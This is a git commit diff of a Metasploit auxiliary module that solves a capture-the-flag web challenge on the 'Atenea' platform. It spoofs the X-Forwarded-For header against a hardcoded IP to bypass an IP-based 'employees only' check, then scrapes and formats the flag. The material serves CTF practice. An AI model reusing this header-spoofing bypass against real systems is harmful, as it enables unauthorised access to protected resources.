73014e1b4375d29de548416dc1c95450e1d441f3
Cosas de Puma <kikefontanlorenzo@gmail.com>
2018-09-19 06:57:56 -0400

    :rocket: Better MSF Module

--- .msf4/modules/auxiliary/ctf/atenea/web/soloparaempleados.rb
+++ .msf4/modules/auxiliary/ctf/atenea/web/soloparaempleados.rb
@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Scanner
 
   require 'digest'  # MD5 Module
 
@@ -20,39 +19,28 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE
     )
 
-    deregister_options('RHOSTS', 'THREADS')       # Scanner
     deregister_options('Proxies', 'VHOST', 'SSL') # HttpClient
 
     deregister_options(                           # Advanced Options
       'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
-      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'ShowProgress',
-      'ShowProgressPercent', 'WORKSPACE'
-      ) 
-    
+      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
+      )
+
     register_options([
       Opt::RHOST('85.159.210.133'),               # Override RHOST Option
 
-      OptAddress.new('FORWARD', [false, 'IP address from which the return is made (ccn-cert.cni.es IP)', nil]),
-      OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', nil])
+      OptAddress.new('FORWARD', [true, 'IP address from which the request is made (ccn-cert.cni.es)', '107.154.38.234']),
+      OptString.new('TARGETURI', [true, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/36e1889b/'])
     ], self.class)
   end
 
-  # Scanner Module is necessary to execute run_host
-  def run_host(ip)
-    # Specifying the number of threads is necessary to run the scanner
-    datastore['THREADS']   = 1
 
-    datastore['FORWARD']   = '107.154.38.234' if datastore['FORWARD'] == ''
-    datastore['TARGETURI'] = '/36e1889b/' if datastore['TARGETURI'].nil?
-
+  def run
     begin
-      # Connect to the server
-      connect
-
       # Send a custom GET request to the server
       print_status('Sending GET request...')
       res = send_request_cgi({
-        'uri'     => datastore['TARGETURI'],
+        'uri'     => target_uri.path,
         'method'  => 'GET',
         'headers' => {
           'X-Forwarded-For' => datastore['FORWARD']
@@ -63,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
       flag = res.get_html_document.to_s
       # Grep only the flag line
       flag = flag.scan(/flag.+/)[0]
-      
+
       print_status("Detected #{flag}")
 
       # Format the flag according to the Athena's specifications
@@ -74,10 +62,6 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Solved: #{flag}")
     rescue
       print_error('Unhandled exception during execution')
-
-    # ALWAYS disconnect the client
-    ensure
-      disconnect
     end
   end
 
